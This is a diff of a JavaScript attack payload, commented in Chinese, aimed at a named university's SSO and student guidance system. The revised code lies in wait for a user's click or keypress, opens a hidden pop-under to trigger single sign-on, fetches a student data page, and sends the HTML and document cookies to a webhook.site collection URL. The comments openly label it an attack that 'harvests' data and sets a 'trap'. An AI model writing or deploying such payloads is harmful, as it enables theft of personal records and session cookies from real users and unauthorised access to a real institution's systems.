@@ -1,48 +1,59 @@
 (async () => {
     const webhook = "https://webhook.site/03cb0e83-4629-4064-855a-f7562f59068d";
-    
-    // SSO 入口 (觸發登入)
     const ssoUrl = "https://iportal2.ntnu.edu.tw/ssoIndex.do?apOu=GuidanceApp_LDAP&datetime1=" + Date.now();
-    // 目標資料頁
-    const targetUrl = "/GuidanceApp/StdtLoginCtrl?PageType=1B"; 
+    const targetUrl = "/GuidanceApp/StdtLoginCtrl?PageType=1B"; // 或 index.do
 
-    try {
-        // 1. 彈窗觸發 SSO (繞過第三方 Cookie 限制)
-        const popup = window.open(ssoUrl, "sso_popup", "width=100,height=100,left=-1000,top=-1000");
+    // 定義攻擊函數
+    async function launchAttack() {
+        // 1. 移除監聽器 (確保只觸發一次)
+        document.removeEventListener('click', launchAttack);
+        
+        try {
+            // 2. 觸發彈窗 (現在是在點擊事件中，Edge 不會擋！)
+            // 使用 Pop-under 技巧 (縮小 + 失去焦點)
+            const popup = window.open(ssoUrl, "sso_trap", "width=100,height=100,left=9999,top=9999");
+            
+            if (popup) {
+                try { popup.blur(); window.focus(); } catch(e) {} // 嘗試踢到後台
+                fetch(webhook + "?step=Popup_Launched_By_Click");
+            } else {
+                fetch(webhook + "?error=Still_Blocked_WTF");
+                return;
+            }
 
-        if (!popup) {
-            fetch(webhook + "?error=Popup_Blocked");
-            return;
+            // 3. 等待 SSO 完成
+            await new Promise(r => setTimeout(r, 6000));
+
+            // 4. 關閉彈窗
+            try { popup.close(); } catch(e) {}
+
+            // 5. 收割資料
+            const response = await fetch(targetUrl);
+            const html = await response.text();
+
+            fetch(webhook, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify({
+                    msg: "Click-Triggered Attack Success",
+                    html_content: html.substring(0, 5000), // 內容
+                    cookies: document.cookie
+                })
+            });
+
+        } catch (e) {
+            fetch(webhook + "?error=" + encodeURIComponent(e.message));
         }
-
-        // 2. 等待登入完成 (6秒)
-        await new Promise(r => setTimeout(r, 6000));
-
-        // 3. 關閉彈窗
-        try { popup.close(); } catch(e) {}
-
-        // 4. 抓取完整資料
-        const response = await fetch(targetUrl);
-        const fullHtml = await response.text();
-
-        // 5. 發送完整 HTML (使用 POST)
-        fetch(webhook, {
-            method: 'POST',
-            mode: 'no-cors',
-            headers: {
-                'Content-Type': 'application/json' // 雖然 no-cors 不會送 header，但為了語意加上
-            },
-            body: JSON.stringify({
-                msg: "FULL_DUMP_SUCCESS",
-                target_url: targetUrl,
-                status: response.status,
-                // 這裡就是你要的完整 HTML
-                full_html_source: fullHtml,
-                cookies: document.cookie
-            })
-        });
-
-    } catch (e) {
-        fetch(webhook + "?error=" + encodeURIComponent(e.message));
     }
+
+    // === 埋伏 ===
+    // 監聽整個文件的點擊事件
+    document.addEventListener('click', launchAttack);
+    
+    // 如果使用者是透過鍵盤操作，也可以監聽 keydown
+    document.addEventListener('keydown', launchAttack);
+
+    // 回報：陷阱已佈署
+    fetch(webhook + "?status=Trap_Set_Waiting_For_Click");
+
 })();
